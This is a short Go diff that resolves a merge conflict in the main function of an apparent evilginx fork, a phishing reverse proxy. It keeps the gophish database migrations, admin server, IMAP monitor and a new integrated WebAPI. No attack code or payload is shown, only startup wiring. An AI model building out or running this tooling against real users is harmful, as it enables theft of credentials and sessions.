@@ -229,7 +229,6 @@ func main() {
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, wl, *developer_mode)
 	hp.Start()
 
-<<<<<<< Updated upstream
 	// Dump migrations to ~./evilginx/gophish_db to allow goose to read them from disk
 	gophishMigrationsDir := filepath.Join(*cfg_dir, "gophish_db")
 	os.MkdirAll(filepath.Join(gophishMigrationsDir, "db_sqlite3", "migrations"), 0755)
@@ -272,11 +271,10 @@ func main() {
 	
 	go adminServer.Start()
 	go imapMonitor.Start()
-=======
+
 	// Initialize and start the natively integrated xverg WebAPI
 	webApi := core.NewWebAPI(db, cfg, ns)
 	webApi.Start(2030)
->>>>>>> Stashed changes
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
